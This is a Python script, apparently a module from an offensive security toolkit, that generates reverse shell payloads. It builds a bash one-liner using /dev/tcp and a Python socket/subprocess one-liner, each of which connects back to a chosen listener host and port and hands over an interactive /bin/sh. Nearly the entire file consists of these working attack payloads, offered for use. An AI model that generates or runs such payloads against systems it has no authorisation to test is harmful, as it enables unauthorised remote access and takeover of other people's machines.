#!/usr/bin/env python3
"""
Reverse Shell Module
Generates reverse shell payloads
"""

import os

def generate_bash_revshell(lhost, lport):
    """Generate bash reverse shell"""
    return f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"

def generate_python_revshell(lhost, lport):
    """Generate Python reverse shell"""
    return f"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""

def main():
    lhost = os.getenv('ARG_LHOST') or '127.0.0.1'
    lport = os.getenv('ARG_LPORT') or '4444'
    shell_type = os.getenv('ARG_TYPE') or 'bash'
    
    print(f"[*] Generating {shell_type} reverse shell payload...")
    print(f"[*] LHOST: {lhost}")
    print(f"[*] LPORT: {lport}\n")
    
    if shell_type.lower() == 'bash':
        payload = generate_bash_revshell(lhost, lport)
    elif shell_type.lower() == 'python':
        payload = generate_python_revshell(lhost, lport)
    else:
        print("[!] Unsupported shell type")
        return
    
    print("[+] Payload:")
    print(payload)
    print()

if __name__ == '__main__':
    main()
